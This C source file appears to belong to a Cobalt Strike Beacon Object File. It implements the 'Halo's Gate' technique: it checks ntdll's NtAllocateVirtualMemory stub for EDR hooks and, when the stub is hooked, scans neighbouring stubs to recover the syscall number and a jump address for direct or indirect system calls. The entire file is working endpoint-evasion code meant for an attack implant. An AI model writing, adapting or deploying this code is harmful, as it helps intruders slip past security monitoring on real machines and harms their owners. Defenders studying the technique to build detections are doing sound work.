#include <windows.h>

#include "Ntdll.h"
#include "Syscalls.h"
#include "Bofdefs.h"
#include "Beacon.h"

#define DOWN	32

BOOL HalosGate(
	_In_	PVOID	pFunctionAddr,
	_Inout_	PDWORD	dwSyscall,
	_Inout_	PVOID* pJmpAddr
)
{


	if (
		*(PBYTE)((PBYTE)pFunctionAddr) == 0x4C &&
		*(PBYTE)((PBYTE)pFunctionAddr + 1) == 0x8B &&
		*(PBYTE)((PBYTE)pFunctionAddr + 2) == 0xD1 &&
		*(PBYTE)((PBYTE)pFunctionAddr + 3) == 0xB8 &&
		*(PBYTE)((PBYTE)pFunctionAddr + 6) == 0x00 &&
		*(PBYTE)((PBYTE)pFunctionAddr + 7) == 0x00
		)
	{
		// Function not hooked
		//BeaconPrintf(CALLBACK_OUTPUT,"[!] No hook present on this function !\n");
		BYTE high = *((PBYTE)pFunctionAddr + 5);
		BYTE low = *((PBYTE)pFunctionAddr + 4);
		*dwSyscall = (high << 8) | low;
		*pJmpAddr = ((PBYTE)pFunctionAddr + 0x12);

		return TRUE;
	}
	else
	{
		//BeaconPrintf(CALLBACK_OUTPUT,"[!] Hook is present on this function !\n");
		for (int i = 1; i < 500; i++)
		{
			if (
				*(PBYTE)((PBYTE)pFunctionAddr + i * DOWN) == 0x4C &&
				*(PBYTE)((PBYTE)pFunctionAddr + 1 + i * DOWN) == 0x8B &&
				*(PBYTE)((PBYTE)pFunctionAddr + 2 + i * DOWN) == 0xD1 &&
				*(PBYTE)((PBYTE)pFunctionAddr + 3 + i * DOWN) == 0xB8 &&
				*(PBYTE)((PBYTE)pFunctionAddr + 6 + i * DOWN) == 0x00 &&
				*(PBYTE)((PBYTE)pFunctionAddr + 7 + i * DOWN) == 0x00
				)
			{
				BYTE high = *((PBYTE)pFunctionAddr + 5 + i * DOWN);
				BYTE low = *((PBYTE)pFunctionAddr + 4 + i * DOWN);
				*dwSyscall = (high << 8) | low - i;
				*pJmpAddr = ((PBYTE)pFunctionAddr + 0x12);

				return TRUE;
			}
		}
	}


	return FALSE;
}

BOOL InitNtFunc(
    _In_    PNT_FUNC    NtFunc
)
{
    HMODULE hModNtdll = GetModuleHandleA("Ntdll.dll");
    if (!hModNtdll)
        return FALSE;

    if (!
        HalosGate(GetProcAddress(hModNtdll, "NtAllocateVirtualMemory"), &NtFunc->NtAllocateVirtualMemory.wSyscall, &NtFunc->NtAllocateVirtualMemory.pJmpAddr)
        )
        return FALSE;

    return TRUE;
}